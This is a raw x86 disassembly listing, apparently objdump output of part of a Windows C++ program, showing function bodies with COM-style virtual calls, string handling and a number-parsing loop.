  404e20:	mov    edx,eax
  404e22:	call   0x405320
  404e27:	lea    edx,[ebx+0x44]
  404e2a:	mov    eax,edi
  404e2c:	mov    ecx,DWORD PTR [edx]
  404e2e:	test   ecx,ecx
  404e30:	je     0x404e35
  404e32:	mov    eax,DWORD PTR [ecx+0x10]
  404e35:	push   ecx
  404e36:	mov    ecx,DWORD PTR [ebx+0xc]
  404e39:	push   edi
  404e3a:	push   edi
  404e3b:	push   0x40171c
  404e40:	push   edi
  404e41:	push   edx
  404e42:	push   eax
  404e43:	push   DWORD PTR [ebx+0x4]
  404e46:	lea    edx,[ebp-0x14]
  404e49:	push   DWORD PTR [ebx]
  404e4b:	call   0x40670d
  404e50:	test   eax,eax
  404e52:	je     0x404e9a
  404e54:	mov    ecx,0x138d
  404e59:	call   0x4098dc
  404e5e:	push   eax
  404e5f:	lea    eax,[ebp-0x18]
  404e62:	push   eax
  404e63:	push   ecx
  404e64:	push   ecx
  404e65:	mov    ecx,DWORD PTR [ebp-0x14]
  404e68:	call   0x4082e1
  404e6d:	mov    ecx,DWORD PTR [ebp-0x14]
  404e70:	test   ecx,ecx
  404e72:	je     0x404e87
  404e74:	mov    eax,DWORD PTR [ecx]
  404e76:	push   ecx
  404e77:	mov    esi,DWORD PTR [eax+0x8]
  404e7a:	mov    ecx,esi
  404e7c:	call   DWORD PTR ds:0x41228c
  404e82:	call   esi
  404e84:	mov    DWORD PTR [ebp-0x14],edi
  404e87:	push   ecx
  404e88:	push   DWORD PTR [ebp-0x18]
  404e8b:	mov    ecx,DWORD PTR [ebx+0x30]
  404e8e:	xor    edx,edx
  404e90:	push   0x1d
  404e92:	call   0x40b94a
  404e97:	xor    edi,edi
  404e99:	inc    edi
  404e9a:	or     DWORD PTR [ebp-0x4],0xffffffff
  404e9e:	lea    ecx,[ebp-0x18]
  404ea1:	call   DWORD PTR ds:0x4121c0
  404ea7:	mov    eax,edi
  404ea9:	call   0x40ea1c
  404eae:	ret    
  404eaf:	int3   
  404eb0:	int3   
  404eb1:	int3   
  404eb2:	int3   
  404eb3:	int3   
  404eb4:	push   0x44
  404eb6:	mov    eax,0x40f0d8
  404ebb:	call   0x40eaf2
  404ec0:	mov    edi,ecx
  404ec2:	xor    ebx,ebx
  404ec4:	mov    DWORD PTR [ebp-0x40],ebx
  404ec7:	lea    ecx,[ebp-0x24]
  404eca:	call   DWORD PTR ds:0x4121c4
  404ed0:	mov    DWORD PTR [ebp-0x4],ebx
  404ed3:	mov    DWORD PTR [ebp-0x20],ebx
  404ed6:	mov    DWORD PTR [ebp-0x18],ebx
  404ed9:	mov    DWORD PTR [ebp-0x1c],ebx
  404edc:	mov    DWORD PTR [ebp-0x3c],ebx
  404edf:	mov    DWORD PTR [ebp-0x48],ebx
  404ee2:	mov    DWORD PTR [ebp-0x44],ebx
  404ee5:	lea    eax,[edi+0x18]
  404ee8:	push   eax
  404ee9:	mov    ecx,0x232
  404eee:	call   0x4098dc
  404ef3:	mov    edx,eax
  404ef5:	mov    ecx,DWORD PTR [edi+0x14]
  404ef8:	call   0x405320
  404efd:	mov    BYTE PTR [ebp-0x4],0x1
  404f01:	push   0x401354
  404f06:	lea    ecx,[ebp-0x34]
  404f09:	call   0x40594b
  404f0e:	mov    BYTE PTR [ebp-0x4],0x2
  404f12:	mov    eax,DWORD PTR [eax]
  404f14:	test   eax,eax
  404f16:	je     0x404f1c
  404f18:	mov    ecx,DWORD PTR [eax]
  404f1a:	jmp    0x404f1e
  404f1c:	mov    ecx,ebx
  404f1e:	mov    eax,DWORD PTR [edi+0x10]
  404f21:	mov    esi,DWORD PTR [eax]
  404f23:	lea    edx,[ebp-0x18]
  404f26:	push   edx
  404f27:	push   ebx
  404f28:	push   0x30
  404f2a:	push   ecx
  404f2b:	push   eax
  404f2c:	mov    ecx,DWORD PTR [esi+0x48]
  404f2f:	call   DWORD PTR ds:0x41228c
  404f35:	call   DWORD PTR [esi+0x48]
  404f38:	mov    esi,eax
  404f3a:	mov    BYTE PTR [ebp-0x4],0x1
  404f3e:	lea    ecx,[ebp-0x34]
  404f41:	call   0x4058ac
  404f46:	test   esi,esi
  404f48:	jns    0x404f66
  404f4a:	mov    ecx,esi
  404f4c:	call   0x407454
  404f51:	or     DWORD PTR [ebp-0x4],0xffffffff
  404f55:	lea    ecx,[ebp-0x24]
  404f58:	call   DWORD PTR ds:0x4121c0
  404f5e:	xor    eax,eax
  404f60:	call   0x40ea30
  404f65:	ret    
  404f66:	mov    DWORD PTR [ebp-0x4],ebx
  404f69:	mov    edx,DWORD PTR [edi+0x44]
  404f6c:	mov    ecx,DWORD PTR [ebp-0x18]
  404f6f:	call   0x4070c8
  404f74:	test   eax,eax
  404f76:	jns    0x404f9b
  404f78:	mov    ecx,eax
  404f7a:	call   0x407454
  404f7f:	mov    ecx,DWORD PTR [ebp-0x18]
  404f82:	test   ecx,ecx
  404f84:	je     0x404f51
  404f86:	mov    eax,DWORD PTR [ecx]
  404f88:	push   ecx
  404f89:	mov    esi,DWORD PTR [eax+0x8]
  404f8c:	mov    ecx,esi
  404f8e:	call   DWORD PTR ds:0x41228c
  404f94:	call   esi
  404f96:	mov    DWORD PTR [ebp-0x18],ebx
  404f99:	jmp    0x404f51
  404f9b:	mov    eax,DWORD PTR [ebp-0x18]
  404f9e:	mov    esi,DWORD PTR [eax]
  404fa0:	lea    ecx,[ebp-0x40]
  404fa3:	push   ecx
  404fa4:	lea    ecx,[ebp-0x20]
  404fa7:	push   ecx
  404fa8:	push   0x1
  404faa:	push   0xffffffff
  404fac:	push   eax
  404fad:	mov    ecx,DWORD PTR [esi+0x10]
  404fb0:	call   DWORD PTR ds:0x41228c
  404fb6:	call   DWORD PTR [esi+0x10]
  404fb9:	push   ecx
  404fba:	lea    eax,[ebp-0x1c]
  404fbd:	push   eax
  404fbe:	mov    edx,0x40177c
  404fc3:	mov    ecx,DWORD PTR [ebp-0x20]
  404fc6:	call   0x407a1b
  404fcb:	mov    ecx,DWORD PTR [ebp-0x20]
  404fce:	test   ecx,ecx
  404fd0:	je     0x404fe5
  404fd2:	mov    eax,DWORD PTR [ecx]
  404fd4:	push   ecx
  404fd5:	mov    esi,DWORD PTR [eax+0x8]
  404fd8:	mov    ecx,esi
  404fda:	call   DWORD PTR ds:0x41228c
  404fe0:	call   esi
  404fe2:	mov    DWORD PTR [ebp-0x20],ebx
  404fe5:	mov    ecx,DWORD PTR [ebp-0x18]
  404fe8:	test   ecx,ecx
  404fea:	je     0x404fff
  404fec:	mov    eax,DWORD PTR [ecx]
  404fee:	push   ecx
  404fef:	mov    esi,DWORD PTR [eax+0x8]
  404ff2:	mov    ecx,esi
  404ff4:	call   DWORD PTR ds:0x41228c
  404ffa:	call   esi
  404ffc:	mov    DWORD PTR [ebp-0x18],ebx
  404fff:	cmp    DWORD PTR [ebp-0x1c],0x0
  405003:	je     0x40507e
  405005:	push   0x20
  405007:	xor    edx,edx
  405009:	mov    ecx,DWORD PTR [edi+0x30]
  40500c:	call   0x40b780
  405011:	mov    esi,eax
  405013:	test   esi,esi
  405015:	jne    0x405029
  405017:	push   0x8000ffff
  40501c:	call   DWORD PTR ds:0x412014
  405022:	call   0x4095c0
  405027:	jmp    0x40506a
  405029:	mov    ecx,esi
  40502b:	call   0x40b148
  405030:	lea    ecx,[ebp-0x1c]
  405033:	call   DWORD PTR ds:0x4121c4
  405039:	mov    BYTE PTR [ebp-0x4],0x4
  40503d:	push   0x79
  40503f:	pop    ecx
  405040:	call   0x4098dc
  405045:	push   eax
  405046:	lea    eax,[ebp-0x1c]
  405049:	push   eax
  40504a:	call   DWORD PTR ds:0x4121b4
  405050:	pop    ecx
  405051:	mov    edx,DWORD PTR [ebp-0x1c]
  405054:	mov    ecx,esi
  405056:	call   0x40b1ba
  40505b:	mov    BYTE PTR [ebp-0x4],bl
  40505e:	lea    ecx,[ebp-0x1c]
  405061:	call   DWORD PTR ds:0x4121c0
  405067:	xor    ebx,ebx
  405069:	inc    ebx
  40506a:	or     DWORD PTR [ebp-0x4],0xffffffff
  40506e:	lea    ecx,[ebp-0x24]
  405071:	call   DWORD PTR ds:0x4121c0
  405077:	mov    eax,ebx
  405079:	jmp    0x404f60
  40507e:	mov    BYTE PTR [ebp-0x4],0x5
  405082:	push   0x4014ec
  405087:	lea    ecx,[ebp-0x34]
  40508a:	call   0x40594b
  40508f:	mov    BYTE PTR [ebp-0x4],0x6
  405093:	mov    eax,DWORD PTR [eax]
  405095:	test   eax,eax
  405097:	je     0x40509d
  405099:	mov    ecx,DWORD PTR [eax]
  40509b:	jmp    0x40509f
  40509d:	mov    ecx,ebx
  40509f:	mov    eax,DWORD PTR [edi+0x10]
  4050a2:	mov    esi,DWORD PTR [eax]
  4050a4:	lea    edx,[ebp-0x18]
  4050a7:	push   edx
  4050a8:	push   ebx
  4050a9:	push   0x30
  4050ab:	push   ecx
  4050ac:	push   eax
  4050ad:	mov    ecx,DWORD PTR [esi+0x48]
  4050b0:	call   DWORD PTR ds:0x41228c
  4050b6:	call   DWORD PTR [esi+0x48]
  4050b9:	mov    esi,eax
  4050bb:	mov    BYTE PTR [ebp-0x4],0x5
  4050bf:	lea    ecx,[ebp-0x34]
  4050c2:	call   0x4058ac
  4050c7:	test   esi,esi
  4050c9:	js     0x404f4a
  4050cf:	mov    DWORD PTR [ebp-0x4],ebx
  4050d2:	mov    edx,DWORD PTR [edi+0x44]
  4050d5:	mov    ecx,DWORD PTR [ebp-0x18]
  4050d8:	call   0x4070c8
  4050dd:	test   eax,eax
  4050df:	js     0x404f78
  4050e5:	mov    eax,DWORD PTR [ebp-0x18]
  4050e8:	mov    esi,DWORD PTR [eax]
  4050ea:	lea    ecx,[ebp-0x40]
  4050ed:	push   ecx
  4050ee:	lea    ecx,[ebp-0x20]
  4050f1:	push   ecx
  4050f2:	push   0x1
  4050f4:	push   0xffffffff
  4050f6:	push   eax
  4050f7:	mov    ecx,DWORD PTR [esi+0x10]
  4050fa:	call   DWORD PTR ds:0x41228c
  405100:	call   DWORD PTR [esi+0x10]
  405103:	push   ecx
  405104:	lea    eax,[ebp-0x48]
  405107:	push   eax
  405108:	mov    edx,0x4017a0
  40510d:	mov    ecx,DWORD PTR [ebp-0x20]
  405110:	call   0x407a1b
  405115:	push   ecx
  405116:	lea    eax,[ebp-0x3c]
  405119:	push   eax
  40511a:	mov    edx,0x4017f0
  40511f:	mov    ecx,DWORD PTR [ebp-0x20]
  405122:	call   0x407a1b
  405127:	push   ecx
  405128:	lea    eax,[ebp-0x44]
  40512b:	push   eax
  40512c:	mov    edx,0x401820
  405131:	mov    ecx,DWORD PTR [ebp-0x20]
  405134:	call   0x407a1b
  405139:	mov    ecx,DWORD PTR [ebp-0x20]
  40513c:	test   ecx,ecx
  40513e:	je     0x405153
  405140:	mov    eax,DWORD PTR [ecx]
  405142:	push   ecx
  405143:	mov    esi,DWORD PTR [eax+0x8]
  405146:	mov    ecx,esi
  405148:	call   DWORD PTR ds:0x41228c
  40514e:	call   esi
  405150:	mov    DWORD PTR [ebp-0x20],ebx
  405153:	mov    ecx,DWORD PTR [ebp-0x18]
  405156:	test   ecx,ecx
  405158:	je     0x40516d
  40515a:	mov    eax,DWORD PTR [ecx]
  40515c:	push   ecx
  40515d:	mov    esi,DWORD PTR [eax+0x8]
  405160:	mov    ecx,esi
  405162:	call   DWORD PTR ds:0x41228c
  405168:	call   esi
  40516a:	mov    DWORD PTR [ebp-0x18],ebx
  40516d:	push   0x20
  40516f:	xor    edx,edx
  405171:	mov    ecx,DWORD PTR [edi+0x30]
  405174:	call   0x40b780
  405179:	mov    DWORD PTR [ebp-0x1c],eax
  40517c:	test   eax,eax
  40517e:	jne    0x405195
  405180:	push   0x8000ffff
  405185:	call   DWORD PTR ds:0x412014
  40518b:	call   0x4095c0
  405190:	jmp    0x404f7f
  405195:	mov    ecx,eax
  405197:	call   0x40b148
  40519c:	lea    ecx,[ebp-0x28]
  40519f:	call   DWORD PTR ds:0x4121c4
  4051a5:	mov    BYTE PTR [ebp-0x4],0x8
  4051a9:	cmp    DWORD PTR [ebp-0x3c],0x0
  4051ad:	je     0x4051bd
  4051af:	mov    esi,0x88
  4051b4:	mov    ecx,esi
  4051b6:	call   0x4098dc
  4051bb:	jmp    0x4051cc
  4051bd:	mov    ecx,0x89
  4051c2:	call   0x4098dc
  4051c7:	mov    esi,0x88
  4051cc:	push   eax
  4051cd:	push   0x76
  4051cf:	pop    ecx
  4051d0:	call   0x4098dc
  4051d5:	push   eax
  4051d6:	lea    eax,[ebp-0x28]
  4051d9:	push   eax
  4051da:	call   DWORD PTR ds:0x4121b4
  4051e0:	pop    ecx
  4051e1:	pop    ecx
  4051e2:	mov    edx,DWORD PTR [ebp-0x28]
  4051e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4051e8:	call   0x40b1ba
  4051ed:	lea    ecx,[ebp-0x2c]
  4051f0:	call   DWORD PTR ds:0x4121c4
  4051f6:	mov    BYTE PTR [ebp-0x4],0x9
  4051fa:	cmp    DWORD PTR [ebp-0x44],0x0
  4051fe:	mov    ecx,esi
  405200:	jne    0x405207
  405202:	mov    ecx,0x89
  405207:	call   0x4098dc
  40520c:	push   eax
  40520d:	push   0x77
  40520f:	pop    ecx
  405210:	call   0x4098dc
  405215:	push   eax
  405216:	lea    eax,[ebp-0x2c]
  405219:	push   eax
  40521a:	call   DWORD PTR ds:0x4121b4
  405220:	pop    ecx
  405221:	pop    ecx
  405222:	mov    edx,DWORD PTR [ebp-0x2c]
  405225:	mov    ecx,DWORD PTR [ebp-0x1c]
  405228:	call   0x40b1ba
  40522d:	lea    ecx,[ebp-0x38]
  405230:	call   DWORD PTR ds:0x4121c4
  405236:	mov    BYTE PTR [ebp-0x4],0xa
  40523a:	cmp    DWORD PTR [ebp-0x48],0x0
  40523e:	mov    ecx,esi
  405240:	jne    0x405247
  405242:	mov    ecx,0x89
  405247:	call   0x4098dc
  40524c:	push   eax
  40524d:	push   0x75
  40524f:	pop    ecx
  405250:	call   0x4098dc
  405255:	push   eax
  405256:	lea    eax,[ebp-0x38]
  405259:	push   eax
  40525a:	call   DWORD PTR ds:0x4121b4
  405260:	pop    ecx
  405261:	pop    ecx
  405262:	mov    edx,DWORD PTR [ebp-0x38]
  405265:	mov    ecx,DWORD PTR [ebp-0x1c]
  405268:	call   0x40b1ba
  40526d:	lea    ecx,[ebp-0x30]
  405270:	call   DWORD PTR ds:0x4121c4
  405276:	mov    BYTE PTR [ebp-0x4],0xb
  40527a:	cmp    DWORD PTR [edi+0x48],ebx
  40527d:	mov    ecx,esi
  40527f:	jne    0x405286
  405281:	mov    ecx,0x89
  405286:	call   0x4098dc
  40528b:	push   eax
  40528c:	push   0x78
  40528e:	pop    ecx
  40528f:	call   0x4098dc
  405294:	push   eax
  405295:	lea    eax,[ebp-0x30]
  405298:	push   eax
  405299:	call   DWORD PTR ds:0x4121b4
  40529f:	pop    ecx
  4052a0:	pop    ecx
  4052a1:	mov    edx,DWORD PTR [ebp-0x30]
  4052a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4052a7:	call   0x40b1ba
  4052ac:	mov    BYTE PTR [ebp-0x4],0xa
  4052b0:	lea    ecx,[ebp-0x30]
  4052b3:	call   DWORD PTR ds:0x4121c0
  4052b9:	mov    BYTE PTR [ebp-0x4],0x9
  4052bd:	lea    ecx,[ebp-0x38]
  4052c0:	call   DWORD PTR ds:0x4121c0
  4052c6:	mov    BYTE PTR [ebp-0x4],0x8
  4052ca:	lea    ecx,[ebp-0x2c]
  4052cd:	call   DWORD PTR ds:0x4121c0
  4052d3:	mov    BYTE PTR [ebp-0x4],bl
  4052d6:	lea    ecx,[ebp-0x28]
  4052d9:	call   DWORD PTR ds:0x4121c0
  4052df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4052e3:	lea    ecx,[ebp-0x24]
  4052e6:	call   DWORD PTR ds:0x4121c0
  4052ec:	xor    eax,eax
  4052ee:	inc    eax
  4052ef:	jmp    0x404f60
  4052f4:	mov    eax,DWORD PTR [ebp-0x4c]
  4052f7:	mov    ecx,DWORD PTR [eax+0x4]
  4052fa:	call   0x407454
  4052ff:	mov    eax,0x405305
  405304:	ret    
  405305:	jmp    0x404f51
  40530a:	mov    eax,DWORD PTR [ebp-0x50]
  40530d:	mov    ecx,DWORD PTR [eax+0x4]
  405310:	call   0x407454
  405315:	mov    eax,0x404f51
  40531a:	ret    
  40531b:	int3   
  40531c:	int3   
  40531d:	int3   
  40531e:	int3   
  40531f:	int3   
  405320:	mov    edi,edi
  405322:	push   ebp
  405323:	mov    ebp,esp
  405325:	sub    esp,0xac
  40532b:	mov    eax,ds:0x411004
  405330:	xor    eax,ebp
  405332:	mov    DWORD PTR [ebp-0x4],eax
  405335:	and    DWORD PTR [ebp-0xac],0x0
  40533c:	xor    eax,eax
  40533e:	push   ebx
  40533f:	mov    ebx,DWORD PTR [ebp+0x8]
  405342:	push   esi
  405343:	push   edi
  405344:	push   0x9e
  405349:	push   eax
  40534a:	mov    WORD PTR [ebp-0xa4],ax
  405351:	mov    edi,edx
  405353:	lea    eax,[ebp-0xa2]
  405359:	mov    esi,ecx
  40535b:	push   eax
  40535c:	call   0x40eb54
  405361:	add    esp,0xc
  405364:	test   esi,esi
  405366:	je     0x4053ef
  40536c:	xor    eax,eax
  40536e:	mov    WORD PTR [ebp-0xa8],ax
  405375:	mov    ax,WORD PTR [ebx+0x6]
  405379:	xor    ebx,ebx
  40537b:	push   0x50
  40537d:	mov    WORD PTR [ebp-0xa6],ax
  405384:	lea    eax,[ebp-0xa4]
  40538a:	pop    ecx
  40538b:	mov    BYTE PTR [eax],bl
  40538d:	inc    eax
  40538e:	sub    ecx,0x1
  405391:	jne    0x40538b
  405393:	push   DWORD PTR [ebp-0xa8]
  405399:	push   esi
  40539a:	call   DWORD PTR ds:0x41201c
  4053a0:	push   ebx
  4053a1:	lea    eax,[ebp-0xac]
  4053a7:	mov    edx,0x40185c
  4053ac:	push   eax
  4053ad:	push   0x4f
  4053af:	push   0x4f
  4053b1:	push   0x4f
  4053b3:	lea    ecx,[ebp-0xa4]
  4053b9:	call   0x40a0ca
  4053be:	push   eax
  4053bf:	push   esi
  4053c0:	call   DWORD PTR ds:0x412020
  4053c6:	push   DWORD PTR [ebp-0xa8]
  4053cc:	push   esi
  4053cd:	call   DWORD PTR ds:0x41201c
  4053d3:	test   edi,edi
  4053d5:	je     0x4053ef
  4053d7:	push   ebx
  4053d8:	lea    eax,[ebp-0xac]
  4053de:	mov    ecx,edi
  4053e0:	push   eax
  4053e1:	call   0x40a30b
  4053e6:	push   eax
  4053e7:	push   edi
  4053e8:	push   esi
  4053e9:	call   DWORD PTR ds:0x412020
  4053ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4053f2:	pop    edi
  4053f3:	pop    esi
  4053f4:	xor    ecx,ebp
  4053f6:	pop    ebx
  4053f7:	call   0x40e2c0
  4053fc:	mov    esp,ebp
  4053fe:	pop    ebp
  4053ff:	ret    0x4
  405402:	int3   
  405403:	int3   
  405404:	int3   
  405405:	int3   
  405406:	int3   
  405407:	push   0x24
  405409:	mov    eax,0x40f114
  40540e:	call   0x40eab7
  405413:	mov    ebx,ecx
  405415:	mov    DWORD PTR [ebp-0x30],ebx
  405418:	lea    ecx,[ebp-0x18]
  40541b:	call   DWORD PTR ds:0x4121c4
  405421:	xor    esi,esi
  405423:	mov    DWORD PTR [ebp-0x4],esi
  405426:	mov    DWORD PTR [ebp-0x1c],esi
  405429:	mov    DWORD PTR [ebp-0x20],esi
  40542c:	mov    DWORD PTR [ebp-0x14],esi
  40542f:	mov    BYTE PTR [ebp-0x4],0x1
  405433:	lea    eax,[ebp-0x14]
  405436:	push   eax
  405437:	push   0x80000000
  40543c:	push   esi
  40543d:	call   DWORD PTR ds:0x412000
  405443:	mov    DWORD PTR [ebp-0x28],eax
  405446:	test   eax,eax
  405448:	je     0x405464
  40544a:	call   0x4095c0
  40544f:	or     DWORD PTR [ebp-0x4],0xffffffff
  405453:	lea    ecx,[ebp-0x18]
  405456:	call   DWORD PTR ds:0x4121c0
  40545c:	xor    eax,eax
  40545e:	call   0x40ea03
  405463:	ret    
  405464:	cmp    DWORD PTR [ebp-0x14],0x0
  405468:	jne    0x405477
  40546a:	push   0x8007000e
  40546f:	call   DWORD PTR ds:0x412014
  405475:	jmp    0x40544a
  405477:	lea    eax,[ebp-0x1c]
  40547a:	push   eax
  40547b:	push   0x1
  40547d:	push   esi
  40547e:	push   0x401860
  405483:	push   DWORD PTR [ebp-0x14]
  405486:	call   DWORD PTR ds:0x412004
  40548c:	mov    edi,eax
  40548e:	mov    DWORD PTR [ebp-0x28],edi
  405491:	test   edi,edi
  405493:	je     0x4054bb
  405495:	lea    eax,[edi-0x1]
  405498:	sub    eax,0x1
  40549b:	je     0x4054a0
  40549d:	push   edi
  40549e:	jmp    0x4054a5
  4054a0:	push   0x3f7
  4054a5:	call   DWORD PTR ds:0x412014
  4054ab:	call   0x4095c0
  4054b0:	push   DWORD PTR [ebp-0x14]
  4054b3:	call   DWORD PTR ds:0x412008
  4054b9:	jmp    0x40544f
  4054bb:	cmp    DWORD PTR [ebp-0x1c],0x0
  4054bf:	je     0x40546a
  4054c1:	push   0x4
  4054c3:	lea    eax,[ebp-0x24]
  4054c6:	push   eax
  4054c7:	mov    ecx,ebx
  4054c9:	call   DWORD PTR ds:0x412190
  4054cf:	mov    BYTE PTR [ebp-0x4],0x2
  4054d3:	push   eax
  4054d4:	lea    ecx,[ebp-0x18]
  4054d7:	call   DWORD PTR ds:0x4121bc
  4054dd:	mov    BYTE PTR [ebp-0x4],0x1
  4054e1:	lea    ecx,[ebp-0x24]
  4054e4:	call   DWORD PTR ds:0x4121c0
  4054ea:	mov    ecx,0x80
  4054ef:	mov    DWORD PTR [ebp-0x20],ecx
  4054f2:	call   0x40ab1d
  4054f7:	mov    ebx,eax
  4054f9:	mov    DWORD PTR [ebp-0x24],ebx
  4054fc:	test   ebx,ebx
  4054fe:	je     0x405551
  405500:	lea    eax,[ebp-0x20]
  405503:	push   eax
  405504:	push   ebx
  405505:	push   esi
  405506:	push   esi
  405507:	push   DWORD PTR [ebp-0x18]
  40550a:	push   DWORD PTR [ebp-0x1c]
  40550d:	call   DWORD PTR ds:0x41200c
  405513:	mov    edi,eax
  405515:	mov    DWORD PTR [ebp-0x28],edi
  405518:	cmp    edi,0xea
  40551e:	jne    0x405551
  405520:	lea    ecx,[ebp-0x24]
  405523:	call   0x40aa69
  405528:	mov    ecx,DWORD PTR [ebp-0x20]
  40552b:	call   0x40ab1d
  405530:	mov    ebx,eax
  405532:	mov    DWORD PTR [ebp-0x24],ebx
  405535:	test   ebx,ebx
  405537:	je     0x405551
  405539:	lea    eax,[ebp-0x20]
  40553c:	push   eax
  40553d:	push   ebx
  40553e:	push   esi
  40553f:	push   esi
  405540:	push   DWORD PTR [ebp-0x18]
  405543:	push   DWORD PTR [ebp-0x1c]
  405546:	call   DWORD PTR ds:0x41200c
  40554c:	mov    edi,eax
  40554e:	mov    DWORD PTR [ebp-0x28],edi
  405551:	push   DWORD PTR [ebp-0x1c]
  405554:	call   DWORD PTR ds:0x412008
  40555a:	mov    DWORD PTR [ebp-0x1c],esi
  40555d:	cmp    DWORD PTR [ebp-0x14],0x0
  405561:	je     0x40556f
  405563:	push   DWORD PTR [ebp-0x14]
  405566:	call   DWORD PTR ds:0x412008
  40556c:	mov    DWORD PTR [ebp-0x14],esi
  40556f:	test   edi,edi
  405571:	je     0x405580
  405573:	lea    ecx,[ebp-0x24]
  405576:	call   0x40aa69
  40557b:	jmp    0x40544f
  405580:	mov    edx,ebx
  405582:	push   0x40
  405584:	pop    ecx
  405585:	mov    DWORD PTR [ebp-0x2c],edx
  405588:	movzx  eax,WORD PTR [edx]
  40558b:	test   ax,ax
  40558e:	je     0x40559a
  405590:	cmp    ax,cx
  405593:	je     0x40559f
  405595:	add    edx,0x2
  405598:	jmp    0x405585
  40559a:	cmp    WORD PTR [edx],cx
  40559d:	jne    0x4055b4
  40559f:	push   esi
  4055a0:	mov    ecx,edx
  4055a2:	sub    ecx,ebx
  4055a4:	sar    ecx,1
  4055a6:	mov    eax,DWORD PTR [ebp-0x20]
  4055a9:	sub    eax,ecx
  4055ab:	push   eax
  4055ac:	push   edx
  4055ad:	push   edx
  4055ae:	call   DWORD PTR ds:0x412118
  4055b4:	push   ebx
  4055b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4055b8:	call   DWORD PTR ds:0x4121b0
  4055be:	lea    ecx,[ebp-0x24]
  4055c1:	call   0x40aa69
  4055c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4055ca:	lea    ecx,[ebp-0x18]
  4055cd:	call   DWORD PTR ds:0x4121c0
  4055d3:	xor    eax,eax
  4055d5:	inc    eax
  4055d6:	jmp    0x40545e
  4055db:	cmp    DWORD PTR [ebp-0x1c],0x0
  4055df:	je     0x4055f1
  4055e1:	push   DWORD PTR [ebp-0x1c]
  4055e4:	call   DWORD PTR ds:0x412008
  4055ea:	xor    esi,esi
  4055ec:	mov    DWORD PTR [ebp-0x1c],esi
  4055ef:	jmp    0x4055f3
  4055f1:	xor    esi,esi
  4055f3:	cmp    DWORD PTR [ebp-0x14],0x0
  4055f7:	je     0x405605
  4055f9:	push   DWORD PTR [ebp-0x14]
  4055fc:	call   DWORD PTR ds:0x412008
  405602:	mov    DWORD PTR [ebp-0x14],esi
  405605:	mov    ecx,0x8007000e
  40560a:	call   0x407454
  40560f:	mov    eax,0x40544f
  405614:	ret    
  405615:	int3   
  405616:	int3   
  405617:	int3   
  405618:	int3   
  405619:	int3   
  40561a:	push   0x6c
  40561c:	mov    eax,0x40f158
  405621:	call   0x40eab7
  405626:	mov    DWORD PTR [ebp-0x4c],edx
  405629:	mov    DWORD PTR [ebp-0x48],ecx
  40562c:	lea    ecx,[ebp-0x1c]
  40562f:	call   DWORD PTR ds:0x4121c4
  405635:	xor    ebx,ebx
  405637:	mov    DWORD PTR [ebp-0x4],ebx
  40563a:	mov    DWORD PTR [ebp-0x2c],ebx
  40563d:	lea    ecx,[ebp-0x20]
  405640:	call   DWORD PTR ds:0x4121c4
  405646:	mov    BYTE PTR [ebp-0x4],0x1
  40564a:	mov    BYTE PTR [ebp-0x4],0x2
  40564e:	push   ebx
  40564f:	push   ebx
  405650:	push   0x10
  405652:	push   0x400
  405657:	call   DWORD PTR ds:0x412028
  40565d:	mov    edi,eax
  40565f:	mov    DWORD PTR [ebp-0x28],edi
  405662:	test   edi,edi
  405664:	jne    0x40566e
  405666:	mov    BYTE PTR [ebp-0x4],bl
  405669:	jmp    0x405873
  40566e:	lea    esi,[edi+0x2]
  405671:	push   esi
  405672:	lea    ecx,[ebp-0x1c]
  405675:	call   DWORD PTR ds:0x4121c8
  40567b:	mov    ecx,eax
  40567d:	mov    DWORD PTR [ebp-0x24],ecx
  405680:	add    esi,esi
  405682:	mov    DWORD PTR [ebp-0x34],esi
  405685:	mov    DWORD PTR [ebp-0x30],eax
  405688:	test   esi,esi
  40568a:	je     0x405698
  40568c:	mov    BYTE PTR [eax],bl
  40568e:	inc    eax
  40568f:	mov    DWORD PTR [ebp-0x30],eax
  405692:	dec    esi
  405693:	mov    DWORD PTR [ebp-0x34],esi
  405696:	jmp    0x405688
  405698:	push   edi
  405699:	push   ecx
  40569a:	push   0x10
  40569c:	mov    edi,0x400
  4056a1:	push   edi
  4056a2:	call   DWORD PTR ds:0x412028
  4056a8:	mov    esi,ebx
  4056aa:	mov    DWORD PTR [ebp-0x28],esi
  4056ad:	mov    DWORD PTR [ebp-0x24],ebx
  4056b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4056b3:	lea    ecx,[ebp-0x1c]
  4056b6:	call   DWORD PTR ds:0x4121b8
  4056bc:	mov    eax,DWORD PTR [eax+0x4]
  4056bf:	mov    DWORD PTR [ebp-0x50],eax
  4056c2:	cmp    esi,eax
  4056c4:	jge    0x405750
  4056ca:	push   0x1
  4056cc:	push   esi
  4056cd:	lea    eax,[ebp-0x38]
  4056d0:	push   eax
  4056d1:	lea    ecx,[ebp-0x1c]
  4056d4:	call   DWORD PTR ds:0x4121d8
  4056da:	mov    DWORD PTR [ebp-0x54],eax
  4056dd:	mov    BYTE PTR [ebp-0x4],0x3
  4056e1:	mov    ecx,DWORD PTR [eax]
  4056e3:	mov    DWORD PTR [ebp-0x58],ecx
  4056e6:	call   0x409aea
  4056eb:	test   eax,eax
  4056ed:	setne  bl
  4056f0:	mov    BYTE PTR [ebp-0x15],bl
  4056f3:	mov    BYTE PTR [ebp-0x4],0x2
  4056f7:	lea    ecx,[ebp-0x38]
  4056fa:	call   DWORD PTR ds:0x4121c0
  405700:	test   bl,bl
  405702:	je     0x405742
  405704:	push   0x1
  405706:	push   esi
  405707:	lea    eax,[ebp-0x3c]
  40570a:	push   eax
  40570b:	lea    ecx,[ebp-0x1c]
  40570e:	call   DWORD PTR ds:0x4121d8
  405714:	mov    DWORD PTR [ebp-0x5c],eax
  405717:	mov    BYTE PTR [ebp-0x4],0x4
  40571b:	mov    ecx,DWORD PTR [eax]
  40571d:	mov    DWORD PTR [ebp-0x60],ecx
  405720:	call   0x409aea
  405725:	mov    ebx,eax
  405727:	imul   eax,DWORD PTR [ebp-0x24],0xa
  40572b:	add    ebx,eax
  40572d:	mov    DWORD PTR [ebp-0x24],ebx
  405730:	mov    DWORD PTR [ebp-0x2c],ebx
  405733:	mov    BYTE PTR [ebp-0x4],0x2
  405737:	lea    ecx,[ebp-0x3c]
  40573a:	call   DWORD PTR ds:0x4121c0
  405740:	jmp    0x405745
  405742:	mov    ebx,DWORD PTR [ebp-0x24]
